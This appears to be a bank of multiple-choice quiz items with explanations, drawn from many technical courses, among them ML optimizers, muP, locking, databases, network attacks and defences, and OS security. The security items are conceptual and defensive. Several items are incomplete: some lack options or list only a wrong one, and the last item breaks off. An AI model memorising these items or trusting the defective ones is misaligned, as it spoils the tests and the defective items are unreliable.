question: During training, what does the head that predicts x(t+3) receive as input at position t?
options: The shared representation of the prefix x(1..t) only
The prefix plus head 1's and head 2's predicted tokens
The true tokens x(t+1) and x(t+2), via teacher forcing
The whole sequence, with future tokens masked out after the loss
explain: In the Gloeckle design all heads read the same shared representation of the prefix ending at t and predict in parallel. No head sees other heads' guesses or any token after t. (DeepSeek-V3 makes a different choice, covered in lesson 4.)

courseTitle: Multi-token prediction: training GPTs to look ahead
lessonTitle: Add MTP to your GPT: both designs in about 60 lines
question: Your Gloeckle-style model uses n = 4 heads with L = 6 blocks in total. How many trunk blocks does it have, and why does that matter for comparing against n = 1?
options: 2 trunk blocks plus 4 head blocks, so all models have 6 blocks and gains cannot come from extra parameters
6 trunk blocks plus 4 heads; MTP models are meant to be larger
5 trunk blocks, as for n = 1, so only the heads differ
0 trunk blocks; heads replace the trunk
explain: The trunk has L - n = 2 blocks. Adding head blocks while removing trunk blocks keeps the total at 6, matching the paper's equal-parameter comparisons. It also means a 4-head model has a much shallower shared trunk, one reason MTP can hurt small models.

courseTitle: Muon, Shampoo and SOAP: optimizers that treat weights as matrices
lessonTitle: Why a weight matrix is not a bag of independent numbers
question: An update has singular values 4.00, 1.00, 0.197 and 0.0019. What does replacing it with its orthogonalized version $UV^\top$ do?
options: Shrinks every entry toward zero, like weight decay
Keeps only the top direction and discards the rest
Keeps the same singular directions but sets every singular value to 1, boosting the weak directions relative to the strong one
Makes the update elementwise plus or minus 1, exactly like sign descent
explain: $UV^\top$ keeps $U$ and $V$ (the directions) and replaces $S$ with the identity. The strongest direction is scaled down from 4.00 to 1 and the weakest is scaled up from 0.0019 to 1. Sign descent is a different, elementwise operation, and as we saw it gives singular values 3.24, 2.00, 1.24, 0.

courseTitle: Muon, Shampoo and SOAP: optimizers that treat weights as matrices
lessonTitle: SOAP: run Adam in the coordinates Shampoo discovers
question: You need to estimate SOAP's optimizer memory for a $4096 \times 4096$ matrix, counting state plus the gradient as the paper does. Which is closest?
options: 33.6M floats, one buffer like Muon
50.3M floats, the same as AdamW
117.4M floats
281 trillion floats, like full-matrix AdaGrad
explain: $2m^2 + 2n^2 + 3mn$ with $m = n = 4096$ is $33.6 + 33.6 + 50.3 \approx 117.4$ million. AdamW uses $3mn = 50.3$M (gradient, first and second moment); Muon uses about $2mn = 33.6$M (gradient and one momentum buffer).

courseTitle: muP: tune a small model, transfer hyperparameters to a large one
lessonTitle: Why the best learning rate drifts as models get wider
question: In the toy problem, what is the best value of the knob c when n = 4096?
options: 0.0361, the same as at n = 256
explain: $c^* = 1/\sqrt{3n} = 1/\sqrt{12288} \approx 0.00902$. The c knob shrinks like $1/\sqrt{n}$, so 16x the width gives a 4x smaller c. 0.577 is the best alpha, which is the width-independent knob.

courseTitle: muP: tune a small model, transfer hyperparameters to a large one
lessonTitle: Deriving the rules from one condition, and muP by hand
question: A colleague's hand-written muP uses `{'params': hidden, 'lr': lr / m}` for hidden weights and computes logits as `self.unemb(h) / m`, but initializes the unembedding with std $\sigma/\sqrt{m}$ and puts it in the hidden group. What does the coord check show?
options: Flat curves, because the 1/m factors cancel
Exploding hidden activations
Nothing; the unembedding has no width dimension
Logits whose updates shrink with width, because the output layer is scaled down twice: by the forward multiplier and again by the hidden-group LR
explain: Table 8 puts the width factor for output weights in the forward multiplier and keeps their LR and init constant. Also dividing the LR by $m$ makes the unembedding's updates, and so the logit changes, shrink like $1/m$: the output layer stops learning at large width.

courseTitle: muP: tune a small model, transfer hyperparameters to a large one
lessonTitle: What muP does not transfer: horizon, weight decay, the SP debate
question: You tuned a muP proxy on 2B tokens and found base LR $4\times10^{-3}$. The target is the same family, 16x wider, trained for 200B tokens. Which adjustment does the evidence say you are most likely missing if you only apply muP's width rules?
options: Multiply the LR by 16 for the longer run
Nothing; muP makes the LR independent of every scale
Lower the LR for the 100x longer horizon, to roughly 0.23x by the fitted law
Double the dropout
explain: muP covers width. Bjorck et al. show the optimal LR keeps falling with the token horizon, also under muP, roughly like $D^{-0.32}$ for large models: $100^{-0.32} \approx 0.23$. Fit the exponent on two or three short horizons if you can.

courseTitle: Mutexes, spinlocks and futexes: how locks really wait
lessonTitle: Building a mutex on a futex: the three-state lock
question: A thread calls lock on an unlocked three-state mutex and later unlocks it, with no other thread involved. How many system calls happen?
options: One: the wake in unlock
Two: a wait and a wake
One: the CAS is a system call
Zero
explain: The CAS turns 0 into 1 in user space. At unlock the swap returns 1, not 2, so the wake is skipped. Atomic instructions are not system calls; the kernel never sees an uncontended lock.

courseTitle: MVCC and transaction isolation levels
lessonTitle: Write skew: the bug that snapshot isolation lets through
question: Which change makes the doctors example safe while staying at Repeatable Read?
options: Run both transactions with a shorter timeout
Add an index on the on_call column
Lock the rows being counted, for example SELECT ... FOR UPDATE on all on-call doctors, so the second transaction waits and then fails or sees the change
Switch to Read Committed so each statement sees fresh data
explain: Write skew comes from reads that do not conflict with the other transaction's write. Turning the reads into row locks (FOR UPDATE) materializes the conflict: the second transaction blocks, then hits a concurrent update error at Repeatable Read. Read Committed does not help; both counts can still run before either update.

courseTitle: Named entity recognition: tagging spans in text
lessonTitle: BIO, IOB1 and BIOES: tag sets that make spans decodable
question: In the CoNLL-2003 data files, when does a B-ORG tag appear?
options: Only when an organisation starts immediately after another organisation ends
At the start of every organisation entity
On every token of a multi-token organisation except the first
Only on single-token organisations
explain: The files use IOB1, the Ramshaw and Marcus scheme: entity tokens are I-ORG by default, and B-ORG marks only the leftmost token of an organisation that immediately follows another organisation. The option saying every organisation entity starts with B-ORG describes IOB2, which is what most modern pipelines convert the files to.

courseTitle: Named entity recognition: tagging spans in text
lessonTitle: Few labels, new domain, and the failure modes that remain
question: Your log tagger scores 91 F1 on a weakly labelled held-out split and 62 F1 on 200 hand-labelled lines. What is the most likely cause?
options: The weakly labelled split shares the labelling functions' blind spots, so it rewards reproducing them rather than finding entities
The hand-labelled set is too small for the metric to be meaningful
The model overfitted the 200 hand-labelled lines
Entity F1 is not comparable across splits
explain: A test set built by the same regexes and gazetteers as the training labels cannot reveal what those functions miss. The tagger gets credit for imitating them. Only human labels measure the task, which is why some of your annotation budget must be held out and never used for training.

courseTitle: Native sparse attention: NSA and DeepSeek Sparse Attention
lessonTitle: Hardware alignment: the kernel and the measured speedups
question: Why does NSA's selection kernel loop over GQA groups at each query position, instead of tiling a block of consecutive queries like FlashAttention?
options: Consecutive queries can select different KV blocks, so a query tile would cause scattered, redundant loads, while heads of one group share exactly the same blocks
Triton cannot tile over the query dimension
It reduces the number of compressed tokens
It makes the selection differentiable
explain: Within a group, every head reads the same selected blocks, so each contiguous block load is reused h times. Consecutive positions have no such guarantee, so tiling them would not share loads.

courseTitle: Native sparse attention: NSA and DeepSeek Sparse Attention
lessonTitle: Where NSA sits: fixed patterns, routing, MoBA and InfLLM-v2
question: Reformer's LSH attention and the Routing Transformer's k-means attention both choose keys by content. Which problem from lesson 1 do they share that NSA avoids?
options: They cannot run on GPUs
Their bucket or cluster choice is discrete, so the loss does not train it directly, and the chosen keys are scattered in memory
They have quadratic cost
They only work for encoders
explain: Hash buckets and cluster assignments are discrete jumps with no gradient (Routing Transformer updates its centroids with k-means, not by the loss), and their members sit anywhere in the sequence. NSA scores contiguous blocks with a compression branch that the loss trains through its own output.

courseTitle: Near-duplicate image search with perceptual hashes
lessonTitle: PDQ, learned copy detectors and building a real pipeline
question: A PDQ lookup returns a stored hash at distance 26 from the query, but the query's quality score is 20. What should the system do by default?
options: Report a confident match, since 26 is under 31
Recompute the hash at 128 bits
Treat the query hash as unreliable and not trust the match, since quality 49 or less is recommended for discarding
Rotate the image 90 degrees and try again
explain: Low quality means the image is nearly featureless (for example close to a solid color), and such hashes collide with many unrelated images. The PDQ README recommends discarding hashes with quality 49 or less, regardless of how close the distance looks.

courseTitle: NeMo RL: NVIDIA's Ray-based post-training library
lessonTitle: Build it yourself: a custom environment and dataset for GRPO
question: You call `register_env("json_math", "json_math_env.JsonMathEnvironment")` and nothing else. Setup fails with "No actor environment registered for json_math_env.JsonMathEnvironment". What is missing?
options: Assign ACTOR_ENVIRONMENT_REGISTRY["json_math_env.JsonMathEnvironment"] = PY_EXECUTABLES.SYSTEM before setup
Rename the environment to math so the built-in entry is used
Set env.json_math.num_workers to at least 1
Return rewards as a single tensor instead of a dict
explain: create_env resolves both a class (ENV_REGISTRY, filled by register_env) and a Python executable for the actor (ACTOR_ENVIRONMENT_REGISTRY). Classes outside the repo must add themselves to the second one, as the repo's research template project does; SYSTEM is the plain interpreter.

courseTitle: NeMo RL: NVIDIA's Ray-based post-training library
lessonTitle: Running the GRPO math example and reading its config
question: A group of 4 rollouts has rewards [1, 1, 1, 0]. With the default leave-one-out and normalization settings, what advantage does the wrong rollout get?
options: -1.0, because its three peers are all 1 so the division is skipped
explain: Its peers [1, 1, 1] are identical, so b = 1 and NeMo RL skips the std division: A = 0 - 1 = -1.0. Each correct rollout sees [1, 1, 0], mean 0.667 and sample std 0.577, so A = 0.333 / 0.577 = 0.577.

courseTitle: Network attacks and defences
lessonTitle: ARP spoofing up close, and how switches stop it
question: Mallory poisons only Ana's cache (telling Ana that the router's IP is at Mallory's MAC) and relays frames. What does Mallory see?
options: Only broadcast frames
Both directions of Ana's internet traffic
Ana's outgoing frames to the internet, but not the replies, which the router sends straight to Ana
Nothing, because the router still knows Ana's real MAC
explain: ARP poisoning is per direction. Ana's cache now sends Ana's frames to Mallory, but the router's cache is untouched, so replies go directly to Ana. To sit fully in the middle an attacker must poison both caches, which is exactly what doubles the signal for defenders.

courseTitle: Network attacks and defences
lessonTitle: DNSSEC, encrypted DNS, and DNS tunnelling as a signal
question: A site's zone is DNSSEC-signed and your resolver validates. An attacker on the café Wi-Fi can read your DNS traffic. Which is true?
options: DNSSEC hides your queries from the attacker
Nothing is protected without DoH
The attacker can forge answers as long as the query ID matches
The attacker can read which names you look up but cannot get a forged answer accepted for that signed zone
explain: DNSSEC gives integrity and origin authentication, not confidentiality. Forged answers fail validation, but the questions are still visible. Hiding them is the job of DoT or DoH between you and the resolver.

courseTitle: Network attacks and defences
lessonTitle: RST injection and the history of TCP session hijacking
question: Under the original TCP rules, an off-path attacker targets a session with a 65,535-byte window. Roughly how many forged RSTs are needed to be sure of hitting the window?
options: 65,535 squared
Exactly 1, if the 4-tuple is right
About 65,537
2^32, about 4.3 billion
explain: Any value inside the window is accepted, so stepping by the window size covers the 2^32 space in 2^32 / 65,535, about 65,537 packets. RFC 5961's exact-match rule removes the window from the equation, restoring the full 2^32 space.

courseTitle: Network attacks and defences
lessonTitle: Firewalls: stateless, stateful and application-aware
question: Which rule best implements NIST's egress advice for a company network 192.0.2.0/24?
options: Allow outbound only on port 53
Drop outbound packets whose source address is not in 192.0.2.0/24, and allow only the outbound services the business needs
Drop all inbound traffic
Allow all outbound traffic, since it comes from inside
explain: Egress filtering drops packets that could not legitimately come from your network (spoofed sources, which feed reflection attacks) and limits outbound services, which hinders malware that needs to reach its controller. Port 53 only would break the business and still allow DNS tunnelling.

courseTitle: Network traffic analysis: Wireshark, Zeek and Suricata
lessonTitle: Capturing at scale: taps, mirror ports, drops and retention
question: Your Zeek sensor on a mirror port shows many conn.log entries with large missed_bytes, but only during the busiest hours. What is the most likely cause?
options: Attackers are deleting packets to hide from the sensor
The switch's mirror port is oversubscribed and drops part of the copy under load
Zeek cannot parse TCP during busy hours
The snapshot length is too small
explain: NIST SP 800-94 warns that a spanning port may not see all traffic under heavy load. Both directions of a busy link can exceed the mirror port's speed, and the excess is discarded silently. A tap or a faster mirror port fixes it; a snapshot length problem would truncate every packet, not only at busy times.

courseTitle: Network traffic analysis: Wireshark, Zeek and Suricata
lessonTitle: Zeek: events, conn.log and protocol detection by content
question: conn.log shows a 2-hour connection from a workstation to an internet address on port 443 with service unset, orig_bytes 4.1 MB and resp_bytes 60 KB. Which reading is best?
options: Normal HTTPS browsing: port 443 is always TLS
Worth investigating: no analyzer confirmed TLS, the session is long, and the client sent far more than it received
A capture problem, because unset service always means packet loss
A DNS tunnel, because DNS uses port 443
explain: Zeek sets service only when an analyzer confirms the protocol by parsing it, so an unset service on 443 means the payload did not look like TLS. A long session that uploads more than it downloads adds to the concern. Unset service does not by itself mean capture loss, but heavy loss can stop an analyzer confirming, so check missed_bytes too.

courseTitle: Network traffic analysis: Wireshark, Zeek and Suricata
lessonTitle: JA4 and JARM: fingerprints that survive shuffling, and server scans
question: Since Chrome 110 randomises extension order, which fingerprint of Chrome stays stable from one connection to the next?
options: JA3, because GREASE values are removed
JA4, because it sorts ciphers and extensions before hashing
Neither, all TLS fingerprints are now useless
JA3S, because it covers the client
explain: JA3 hashes extensions in the order sent, so permutation changes it every time (GREASE removal does not help with ordering). JA4 sorts the cipher and extension lists, so the same set gives the same hash. JA3S fingerprints the server's reply, not the client.

courseTitle: Network traffic analysis: Wireshark, Zeek and Suricata
lessonTitle: Extracting files from traffic: reassembly, true types and hashes
question: Zeek's files.log shows an HTTP response with mime_type application/x-dosexec, while http.log says the server sent Content-Type image/png. What explains the difference?
options: Zeek misread the file
Zeek types files from their content (magic bytes), while Content-Type is whatever the server chose to claim; an executable disguised as an image is a classic red flag
PNG files always start with MZ
The client changed the type during download
explain: Content-Type is a header the sender controls. Zeek's file analysis identifies the type from the bytes themselves, so an MZ header marks a Windows executable regardless of the label. The mismatch is worth an alert of its own.

courseTitle: How networks work, seen by an attacker and a defender
lessonTitle: Ethernet frames and MAC addresses
question: You capture traffic on your laptop, plugged into a switched office LAN, in promiscuous mode (the card hands every frame it receives to the capture program, not only frames addressed to it). What will you see by default?
options: Every frame sent by every device on the LAN
Only frames to or from your laptop, plus broadcast and multicast frames
Nothing at all, because switches encrypt frames
Only frames whose source MAC matches your OUI
explain: Promiscuous mode makes your card accept every frame it receives, but the switch only sends your port the frames meant for you plus broadcasts and multicasts. Seeing other hosts' traffic needs a hub, a mirror port on the switch (a port configured to receive copies of other ports' traffic), or tricking the switch or the hosts, which is exactly what layer 2 attacks try.

courseTitle: How networks work, seen by an attacker and a defender
lessonTitle: TCP: handshake, sequence numbers, flags and teardown
question: The client's ISN is 7000. It sends SYN, completes the handshake, then sends 250 bytes. What acknowledgment number should the server send after receiving them?
explain: The SYN consumes sequence number 7000, so data starts at 7001. 250 bytes cover 7001 to 7250, and the acknowledgment names the next expected byte: 7251.

courseTitle: How networks work, seen by an attacker and a defender
lessonTitle: HTTPS and TLS at a glance: what encryption hides and what it does not
question: A user connects to `https://bank.example`. Why can a device in the middle (say, after ARP spoofing) not simply read the traffic by pretending to be the bank?
options: Because ARP spoofing does not work on Wi-Fi
Because the device cannot present a certificate for bank.example signed by an authority the browser trusts, so the handshake fails or warns
Because TLS hides the IP addresses
Because port 443 cannot be intercepted
explain: The device can relay packets, but to decrypt it must complete the TLS handshake as bank.example, and that requires a trusted certificate and the matching private key. Without them the browser shows an error. The attack then depends on the user ignoring the warning.

courseTitle: NUMA: placing memory and threads on multi-socket machines
lessonTitle: Memory policies: local, bind, preferred and interleave
question: A service is started with `numactl --membind=0` on a 2-node box. Node 0 has 64 GiB, node 1 has 64 GiB, and the service grows to 80 GiB. What happens?
options: The extra 16 GiB is allocated on node 1 automatically
The kernel switches the process to interleave mode
Allocations that node 0 cannot satisfy fail, because bind never falls back to node 1
explain: MPOL_BIND restricts allocation to the listed nodes. numactl(8) says allocation will fail when there is not enough memory on them. If spilling to node 1 is acceptable, use --preferred=0 instead.

courseTitle: NVMe and SSD internals: FTL, garbage collection, write amplification
lessonTitle: Why flash cannot overwrite a page in place
question: A drive uses a direct-mapped layout with 256 KB erase blocks of 4 KB pages. The host overwrites a single 4 KB page. How many page programs does the flash perform?
options: 1, because only one page changed
63, the other live pages
64, the whole block is rewritten after the erase
128, one read and one program per page
explain: After erasing, every page of the block is blank, so all 64 pages (63 preserved plus the new one) must be programmed. That is 64x more flash writing than the host asked for, and the block takes one more P/E cycle per host write.

courseTitle: NVMe and SSD internals: FTL, garbage collection, write amplification
lessonTitle: Parallel flash and the NVMe queue interface
question: A host driver reaps completions by checking the phase tag. After the CQ wraps from the last slot back to slot 0, what must the driver do?
options: Nothing: new entries always have phase tag 1
Reset every phase tag in the queue to 0
Read the controller's CQ tail register
Flip the phase value it expects, because the controller now writes the opposite bit
explain: On each wrap the controller inverts the phase tag it writes. The host tracks the expected value and flips it when its head wraps. The CQ tail is internal to the controller and not visible to the host.

courseTitle: Object detection and counting
lessonTitle: Training and tuning a detector in practice
question: You call `model.predict(img, conf=0.25, iou=0.7)` and see two boxes on one car with IoU 0.6 between them. Which change removes the duplicate?
options: Set iou=0.5 so NMS suppresses boxes overlapping by more than 0.5
Raise conf to 0.5
Set iou=0.9
Set max_det=1
explain: Here `iou` is the NMS threshold: boxes overlapping a higher-scoring box by more than it are removed. At 0.7 a 0.6 overlap survives; at 0.5 it is suppressed. Raising conf might drop the duplicate only if its score is low, and max_det=1 would discard every other car too.

courseTitle: Object storage-backed databases: S3-native and tiered storage
lessonTitle: Keeping object storage off the hot read path
question: In Neon, why does a COMMIT not include the latency of an object storage PUT?
options: Postgres batches commits for up to a second
Durability comes from a majority of safekeepers storing the WAL; pages reach object storage later, off the commit path
The compute node's local NVMe is replicated
Object storage writes are done with S3 Express One Zone
explain: Neon defines commit as WAL acknowledged by a quorum of safekeepers. The pageserver materializes pages and uploads them to object storage asynchronously. If a safekeeper dies, the quorum continues; if the pageserver dies, its state is rebuilt from WAL and object storage.

courseTitle: Observability: metrics, traces, dashboards and SLOs
lessonTitle: Traces: spans, context propagation, and what sampling throws away
question: Which setup guarantees a complete trace for every request that returned a 500?
options: Tail sampling in the collector, which buffers a trace's spans and decides once they are complete
Head sampling at 1 in 10 plus a longer retention period
A trace-id ratio sampler at 0.01, since its decision is deterministic
Setting the sampled bit at the gateway only when the gateway sees an error
explain: Only a decision made after the spans exist can condition on the error. Longer retention keeps dropped spans dropped. A deterministic ratio sampler is still a ratio. The last option fails because the gateway must inject traceparent before the request runs, so at decision time the error has not happened yet, and the downstream spans would already have been dropped.

courseTitle: OCR and document understanding: from pixels to fields
lessonTitle: Scoring OCR output: edit distance, CER and WER
question: You must pick one metric to decide whether an invoice-total extractor is good enough for automatic payment. Which is most appropriate?
options: Average CER over all page text
Average WER over all page text
Exact match of the normalized total field per document
Detection F-score of text boxes
explain: Payment needs the exact amount. Page-level CER can look excellent while the one field that matters has a wrong digit. Field-level exact match after agreed normalization measures what the business cares about.

courseTitle: OS security, privilege and isolation
lessonTitle: Discretionary vs mandatory access control, and the LSM hooks
question: Ana runs `chmod 777 /home/ana/notes.txt`. The SELinux policy does not allow the web server's domain to read files in home directories. Can a compromised web server read the file?
options: Yes, because DAC is checked last and wins
No, because the MAC check runs after DAC and refuses
No, because chmod 777 removes read permission
Yes, because 777 lets everyone read
explain: Both checks must say yes. DAC passes (others have r), then the LSM hook asks the mandatory policy, which the file's owner cannot override, and it refuses.

courseTitle: OS security, privilege and isolation
lessonTitle: Dropping privileges correctly, and sudo's Baron Samedit
question: Why must setresgid come before setresuid when dropping from root?
options: It does not matter
setresuid resets the groups automatically
Group IDs are checked first by the kernel
After the UIDs leave 0 the process loses the capability needed to change GIDs, so a later setresgid would fail and leave root's group in place
explain: Changing GIDs and supplementary groups needs CAP_SETGID. Dropping the UIDs first clears the capabilities, so the group change fails, and if the return value is not checked the process keeps group 0.

courseTitle: OS security, privilege and isolation
lessonTitle: chroot is not a boundary, and Leaky Vessels shows why
question: Which of runc 1.1.12's fixes also protects against file descriptor leaks nobody has found yet?
options: Renaming /sys/fs/cgroup
Closing all internal descriptors before execve and checking that the working directory is inside the container
Marking the one known cgroup descriptor O_CLOEXEC
Disabling WORKDIR in Dockerfiles
explain: Fixing the known leak removes one hole. Closing every non-stdio descriptor and verifying the working directory with getcwd stop the whole class, which is why the advisory recommends them to other runtimes.

courseTitle: OS security, privilege and isolation
lessonTitle: What goes wrong: the confused deputy and TOCTOU races
question: Which change removes the TOCTOU window in a setuid program that calls access() then open()?
options: Dropping the separate check and opening the file with the caller's own effective UID (and O_NOFOLLOW)
Adding sleep() between the calls
Calling access() twice
Checking that the path string does not contain /etc
explain: Any separate check leaves a gap. Making the open itself run with the caller's identity lets the kernel do the check atomically on the file actually opened.

courseTitle: OSINT: open-source intelligence, done ethically
lessonTitle: Ethics and law first: public is not the same as permitted
question: In the 2013 Reddit case, which missing control would have prevented the harm most directly?
options: A faster website
Using more photos
Better image resolution
Not publishing identifications without a mandate, expert verification and review
explain: The harm came from naming people on unverified guesses. More or sharper photos would have produced more confident wrong guesses; the fix is process: mandate, verification by qualified people, review before publication.

courseTitle: OSINT: open-source intelligence, done ethically
lessonTitle: Mapping your own organisation's public footprint
question: Why is RDAP easier to automate than the old WHOIS?
options: It requires no internet connection
It shows registrants' home addresses
Queries are HTTPS addresses and replies are structured JSON
It only works for .com domains
explain: RFC 9082 defines queries as HTTP URLs and RFC 9083 defines JSON responses, so a script can parse fields reliably. Personal data is usually redacted, and RDAP serves many top-level domains (TLDs, such as .com or .org).

courseTitle: OSINT: open-source intelligence, done ethically
lessonTitle: Chronolocation: telling the time from shadows
question: A 2 m sign casts a 2 m shadow. What is the sun's elevation?
options: 90 degrees
30 degrees
45 degrees
60 degrees
explain: s/h = 1 means tan(elevation) = 1, so elevation is 45 degrees. Higher sun would give a shorter shadow; 30 degrees would give a ratio of about 1.73.

courseTitle: OSINT: open-source intelligence, done ethically
lessonTitle: People-search sites, data brokers and protecting your own footprint
question: What does the Pwned Passwords service learn when you check a password with the range API?
options: The full password
The full SHA-1 hash
Only a 5-character hash prefix shared by many passwords
Your email address
explain: Only the prefix is sent; matching happens locally, and padding hides the response size. That is the k-anonymity design.

courseTitle: Building large projects from source (CMake, CUDA builds)
lessonTitle: Targets, PUBLIC vs PRIVATE, and why links fail
question: Library `img` uses libpng only inside img.cpp; its public header img.h never mentions png types. Which line is right?
options: target_link_libraries(img PUBLIC PNG::PNG)
target_link_libraries(img INTERFACE PNG::PNG)
target_link_libraries(img PRIVATE PNG::PNG)
include_directories(/usr/include/libpng) at the top level
explain: Only the implementation uses libpng, so PRIVATE. PUBLIC would leak png's include paths and definitions to every consumer; INTERFACE would not give them to img.cpp itself, so img would fail to compile. A global include_directories bypasses targets entirely.

courseTitle: CI pipelines and test suites: from red checks to reliable tests
lessonTitle: Jobs, needs and matrices: how one push becomes many runs
question: Your PR shows `test (windows-latest)` failed and `test (ubuntu-latest)` and `test (macos-latest)` cancelled. What do you know about Linux and macOS?
options: They passed, because only Windows is marked as failed
They also failed, because cancelled means failed
Nothing yet: with the default fail-fast, GitHub cancelled them when Windows failed
They were skipped because they need the Windows job
explain: `strategy.fail-fast` defaults to true and cancels in-progress and queued matrix jobs when any one fails. Cancelled jobs did not finish, so they give no information. Fix the Windows failure or set `fail-fast: false` to see all results.

courseTitle: Code review: responding to and giving review
lessonTitle: What a reviewer is deciding: the code-health standard
question: Which situation lets a reviewer withhold approval even if the code is clean and well tested?
options: The reviewer would have used a different but equally valid algorithm
The author used tabs where the style guide is silent and the file already uses tabs
The PR adds a feature the project has decided it does not want
The PR is 40 lines and the reviewer expected 30
explain: Google's guide explicitly allows denying a feature the maintainers do not want in their system, however well designed. An equally valid alternative should defer to the author, consistency with the existing file is correct, and line counts alone are not a reason.

courseTitle: Code review: responding to and giving review
lessonTitle: Why reviewer response time dominates time to merge
question: A reviewer in another time zone sees that only two typo fixes remain. The author will be asleep for the next 10 hours. What does Google's guide suggest?
options: Request changes so the author fixes the typos, then review again tomorrow
Wait to approve until the typos are fixed, to keep the process strict
Approve with comments (LGTM with comments), noting the typos to fix before merging
Fix the typos and approve your own commit
explain: Minor remaining comments are exactly the case for LGTM with comments, and the guide calls it especially worth considering across time zones. Requesting another round costs the author a full extra day for two typos.

courseTitle: Contribution norms: CONTRIBUTING, issues, conduct and AI policies
lessonTitle: AI-assisted contributions: label it, keep a human in the loop, or not
question: Which action breaks the Linux kernel's guidance for AI coding assistants?
options: Adding an Assisted-by tag
Letting the assistant add a Signed-off-by line to the commit
Writing a reproducer before sending a bug fix
Stating in the changelog which tool found the bug
explain: Only humans can legally certify the DCO, so AI agents must not add Signed-off-by. The human submitter reviews the code, adds their own sign-off and takes responsibility. The other three are things the guidance asks for.

courseTitle: Git workflow for pull requests: fork, branch, rebase, sign-off
lessonTitle: Pushing rewritten history: --force-with-lease and its limits
question: Why does a plain `git push` fail right after a successful `git rebase upstream/main` on a branch you had already pushed?
options: The pushed commits were rewritten, so the remote tip is no longer an ancestor of your local tip
Rebase deletes the remote branch
GitHub blocks pushes to branches that have an open PR
Rebase changes the remote URL of origin
explain: Without force, git push only accepts fast-forward updates. Rebasing replaced your commits with new ones, so the old remote tip is no longer in your branch's history. Pushing to a branch with an open PR is normal and updates the PR.

courseTitle: Open source licenses, CLAs and the DCO
lessonTitle: License compatibility: can these two pieces of code be combined?
question: Which pair can be combined into one distributed program?
options: GPL-2.0-only code inside a GPL-3.0-only project
MIT code inside a GPL-2.0-only project
GPL-3.0 code inside an Apache-2.0 project that stays Apache-2.0
Apache-2.0 code inside a GPL-2.0-only project
explain: MIT is GPL-compatible: its only condition is keeping the notice, which any GPL version allows. The other three either mix incompatible GPL versions, need the whole to become GPL, or add restrictions GPLv2 forbids.

courseTitle: Performance PRs: benchmark evidence and regression checks
lessonTitle: Noise and bias: making before and after comparable
question: Why does benchstat's documentation recommend interleaving before and after runs?
options: It makes each individual run faster
Go benchmarks crash when run in blocks
So that slow changes in the machine (heat, background jobs) hit both versions evenly instead of only one
Because the U test requires alternating samples
explain: Noise must be spread evenly across both versions. In blocked order, any drift during the session is attributed entirely to whichever version ran later.

courseTitle: Reading a large codebase: search, trace and dig through history
lessonTitle: git blame: who last changed a line, and seeing past noise
question: Plain git blame says every line of a function was last changed by a commit titled "Run formatter". What is the most useful next command?
options: `git log -1` on that commit and conclude its author wrote the function
`git blame --reverse file`
`git grep -p` on the function name
`git blame -w --ignore-rev <formatter-hash> file` to look past the formatting commit
explain: A formatting commit is the last modifier but not the author of the logic. Ignoring whitespace and the formatter commit points each line at the commit that changed its content. --reverse answers a different question: the last revision in which a line still existed.

courseTitle: Reproducing bugs: minimal repros, delta debugging and git bisect
lessonTitle: Delta debugging: let a script shrink the repro
question: You give a reducer an interestingness test that returns success whenever the compiler exits with a non-zero code. The output is a tiny file that triggers a syntax error. What went wrong?
options: The reducer has a bug; delta debugging should never produce invalid input
The input was too large for delta debugging to handle
The test should have returned non-zero for interesting candidates
